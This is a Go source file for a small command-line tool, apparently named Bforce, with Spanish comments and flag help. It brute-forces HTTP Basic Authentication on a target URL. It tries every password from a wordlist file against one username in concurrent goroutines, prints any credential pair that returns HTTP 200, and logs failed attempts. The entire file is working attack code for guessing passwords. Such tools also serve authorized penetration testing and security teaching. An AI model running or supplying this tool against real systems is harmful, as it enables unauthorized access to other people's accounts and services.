package main

import (
	"Bforce/banner"
	"bufio"
	"flag"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
	"log"
	"net/http"
	"os"
)

type Flagsoptions struct {
	Url      string
	Username string
	Password string
	th       int
}

func options() *Flagsoptions {
	Url := flag.String("url", "", "Inserta la url objetivo")
	Username := flag.String("u", "", "inserta el username ")
	Password := flag.String("p", "", "inserta el archivo de las contraseñas")
	th := flag.Int("t", 2, "inserta el numero de hilos")
	flag.Parse()
	return &Flagsoptions{Url: *Url, Username: *Username, Password: *Password, th: *th}

}

func BasicAuth(url, username, password string, doneChannel chan bool) {
	client := &http.Client{}
	request, err := http.NewRequest("GET", url, nil)
	request.SetBasicAuth(username, password)

	response, err := client.Do(request)

	if err != nil {
		log.Fatal(err)
	}

	if response.StatusCode == 200 {
		datos := [][]string{
			{username, password},
		}
		tabla := tablewriter.NewWriter(os.Stdout)
		tabla.SetHeader([]string{"Username", "Password"})
		tabla.SetBorders(tablewriter.Border{Left: true, Top: false, Right: true, Bottom: false})
		tabla.SetCenterSeparator("|")
		tabla.AppendBulk(datos)
		tabla.Render()
		os.Exit(0)
	}

	doneChannel <- true

	if response.StatusCode != 200 {

		color.Yellow("intentos fallidos User : %s Password : %s", username, password)

	}

}

func main() {
	color.Blue(banner.Banner)

	mn := options()

	//abrimos la lista de contraseñas en caso de que no exista se imprime el error
	passwordFile, err := os.Open(mn.Password)

	if err != nil {
		log.Fatal("Error abriendo la lista de passwords ")
	}
	defer passwordFile.Close()

	scanner := bufio.NewScanner(passwordFile)

	doneChannel := make(chan bool)

	numThreads := 0
	maxThreads := mn.th

	for scanner.Scan() {
		numThreads += 1

		password := scanner.Text()
		go BasicAuth(mn.Url, mn.Username, password, doneChannel)

		if numThreads >= maxThreads {
			<-doneChannel
			numThreads -= 1
		}
	}

	//espera todos los hilos antes de volver repetir y obtener los resultados
	for numThreads > 0 {
		<-doneChannel
		numThreads -= 1
	}

}
